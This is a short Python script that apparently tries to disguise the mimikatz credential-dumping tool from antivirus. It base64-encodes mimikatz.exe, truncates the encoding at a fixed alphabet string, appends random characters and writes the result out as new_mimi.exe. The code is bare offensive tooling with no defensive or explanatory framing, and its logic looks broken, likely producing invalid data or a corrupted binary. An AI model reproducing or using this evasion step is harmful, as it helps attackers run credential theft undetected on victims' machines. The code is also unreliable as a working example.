#!/usr/bin/python3

import base64
import random
import string
import os

def mimi():
    filename = 'mimikatz/mimikatz.exe'
    basepath = os.path.dirname(__file__)
    mimipath = os.path.join(basepath,filename)
    mimiakatz_file = open(mimipath, 'rb')
    base64_str = base64.b64encode(mimiakatz_file.read())
    base64_str = base64_str.decode('utf-8')
    split_str = base64_str.split('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    salt = ''.join(random.sample(string.ascii_letters + string.digits, 30))
    new_base64_str = split_str[0] + salt
    filename2 = 'mimikatz/new_mimi.exe'
    mimipath2 = os.path.join(basepath, filename2)
    open(mimipath2, 'wb').write(base64.b64decode(new_base64_str))
    return 1




